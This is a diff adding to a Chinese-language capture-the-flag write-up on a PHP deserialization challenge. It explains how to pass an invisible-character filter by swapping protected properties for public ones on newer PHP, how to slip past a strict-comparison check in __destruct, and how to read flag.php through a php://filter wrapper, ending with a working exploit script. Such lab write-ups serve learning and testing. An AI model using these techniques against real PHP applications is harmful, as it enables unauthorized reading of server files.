@@ -444,5 +444,42 @@ php反序列化的题，考了一些小知识点
 首先稍微看一下代码逻辑：
 1. 首先我们的字符串想被反序列化需要经过一个`is_valid()`函数，他的作用是不允许出现不可见字符，但是注意到类的属性都是protect类型，反序列化后都是不可见的
 2. 经过waf之后就是普通的反序列化，我们需要的是read模式读取flag（本来想试试能不能写马，都是destruct的时候会把content替换为空，所以不行）
+
 我们开始构造exp：
-首先是waf绕过，
+
+首先是waf绕过，对于反序列化时的保护属性问题
+大概从`php7.3`开始有了变化，
+`老版本php`，有原protect属性，又反序列化了一个同名的public属性，此时会出现两个不同属性
+![500](assets/Day%204/file-20251222034216579.png)
+而`新版本php`遇到这种情况会是只有一个protect属性，也就是对属性类型不敏感
+![500](assets/Day%204/file-20251222034358082.png)
+利用这个特性我们可以直接用public属性去改protect属性了（private也可以）
+
+还有就是
+```php
+function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+```
+反序列化后会先把模式改为写，我们只需要传入的op不是字符串而是数字即可绕过if判断
+`因为if中使用的强比较会比较数据类型`
+
+剩下就是利用php伪协议base64加密读取`flag.php
+所以最后exp：
+```php
+<?php
+class FileHandler {
+
+    public $op;
+    public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
+    public $content="Hello World!";
+
+}
+
+$fileHandler = new FileHandler();
+echo (serialize($fileHandler));
+```
+
